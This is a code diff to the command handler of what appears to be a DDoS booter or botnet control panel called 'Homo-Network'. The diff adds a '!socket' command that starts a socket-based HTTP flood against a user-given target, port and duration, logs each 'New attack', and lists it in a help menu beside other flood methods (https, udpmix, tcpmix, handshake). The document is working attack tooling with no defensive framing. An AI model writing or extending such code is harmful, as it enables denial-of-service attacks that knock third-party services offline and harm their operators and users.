@@ -84,6 +84,27 @@ func CommandManager(conn net.Conn) {
 		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
 		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "https", cmd[1], cmd[2])
 
+	} else if strings.HasPrefix(string(line), "!socket") {
+		cmd := strings.Split(string(line), " ")
+		fmt.Println(cmd)
+
+		if len(cmd) < 3 {
+			CommandError("!socket <TARGET> <PORT> <DURATION>\n\r", "!socket http://example.com 443 60\n\r", conn)
+		}
+		if len(cmd) > 4 {
+			CommandError("!socket <TARGET> <PORT> <DURATION>\n\r", "!socket http://example.com 443 60\n\r", conn)
+		}
+
+		if !strings.HasPrefix(cmd[1], "http://") {
+			CommandError("!socket <TARGET> <PORT> <DURATION>\n\r", "!socket http://example.com 443 60\n\r", conn)
+		}
+
+		go server.Socket(cmd[1], cmd[3], cmd[2])
+		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "*")
+		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login))
+		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
+		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "socket", cmd[1], cmd[2])
+
 	} else if strings.HasPrefix(string(line), "!udpmix") {
 		cmd := strings.Split(string(line), " ")
 		fmt.Println(cmd)
@@ -255,6 +276,7 @@ func CommandManager(conn net.Conn) {
 		conn.Write([]byte("\n"))
 
 		conn.Write([]byte(color.HiWhiteString("!https: Basic https flood\t\t| Type: L7\n\r")))
+		conn.Write([]byte(color.HiWhiteString("!socket: Socket http flood\t\t| Type: L7\n\r")))
 		conn.Write([]byte(color.HiWhiteString("!udpmix: Udp mix method\t\t\t| Type: L4\n\r")))
 		conn.Write([]byte(color.HiWhiteString("!tcpmix: Tcp mix method\t\t\t| Type: L4\n\r")))
 		conn.Write([]byte(color.HiWhiteString("!handshake: Handshake method\t\t| Type: L4\n\r")))
